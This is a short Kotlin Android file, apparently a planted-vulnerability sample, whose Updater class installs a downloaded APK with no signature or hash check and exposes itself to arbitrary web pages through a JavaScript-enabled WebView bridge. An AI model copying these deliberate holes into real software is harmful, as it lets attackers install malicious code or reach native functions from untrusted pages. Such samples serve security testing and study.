package com.example
import android.content.pm.PackageInstaller
import android.webkit.WebView
// planted: installs whatever it downloaded, no signature, no hash
class Updater(private val web: WebView) {
    fun install(a: android.app.Activity, apk: java.io.File) {
        val params = PackageInstaller.SessionParams(PackageInstaller.SessionParams.MODE_FULL_INSTALL)
        val s = a.packageManager.packageInstaller.openSession(a.packageManager.packageInstaller.createSession(params))
        apk.inputStream().use { i -> s.openWrite("a", 0, -1).use { o -> i.copyTo(o) } }
    }
    fun show(url: String) { web.settings.javaScriptEnabled = true; web.addJavascriptInterface(this, "native"); web.loadUrl(url) }
}
